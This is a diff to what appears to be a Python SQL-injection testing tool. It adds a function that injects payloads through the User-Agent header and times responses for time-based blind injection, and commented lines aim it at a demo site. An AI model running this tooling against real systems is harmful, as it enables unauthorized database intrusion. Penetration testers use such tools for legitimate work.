@@ -2,7 +2,7 @@ import os
 import sys
 import urllib.request
 from urllib.parse import urljoin
-
+import time
 import urllib3
 import urllib.parse
 from urllib.parse import urlparse
@@ -30,6 +30,9 @@ from lib.core.parser.cmdline import user_proxy
 from lib.core.payloads.blindbased import BlindBased
 from tamper.maintamper import apply_tamper
 from lib.core.parser.cmdline import tamper
+from lib.core.tester.injector.checks import newline_fixation
+from lib.core.tester.injector.parameters import get_url_part
+from extra.averagetime import average_response
 
 def host_injection(url,vuln_parameter="", payload="" ):
 
@@ -385,5 +388,46 @@ def postgre_sql_blind_injection(url):
             logger.error(e)
             traceback.print_exc()
 
+def user_agent_injection(url, vuln_parameter, payload):
+    _responses = []
+    def inject_user_agent(url, vuln_parameter, payload):
+        nonlocal _responses
 
+        request = urllib.request.Request(url)
+        url = get_url_part(url)
+        request = urllib.request.Request(url)
+        payload = newline_fixation(payload)
+        request.add_header('User-Agent', payload)
+        try:
+            response = urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+            return response
+        except ValueError:
+            pass
+
+    if settings.TIME_RELATIVE_ATTACK or True:
+        start = 0
+        end = 0
+        start = time.monotonic()
+
+    try:
+        response = inject_user_agent(url, vuln_parameter, payload)
+    except Exception as err_msg:
+        response = str(err_msg)
+        logger.info(response)
+
+    if settings.TIME_RELATIVE_ATTACK:
+        end = time.monotonic()
+        how_long = float(end - start)
+        _responses.append(how_long)
+        _avres = average_response(_responses)
+        return how_long,_avres
+
+    else:
+        return response
+
+# from lib.core.parser.cmdline import crawl 
+
+# crawl = True
+# for payload in time_based_payload().split("\n"):
+#     print(user_agent_injection("http://testfire.net/index.jsp?content=business_deposit.htm","id",payload))
 # make_set_sql_injection("http://testfire.net/index.jsp?content=business_deposit.htm")
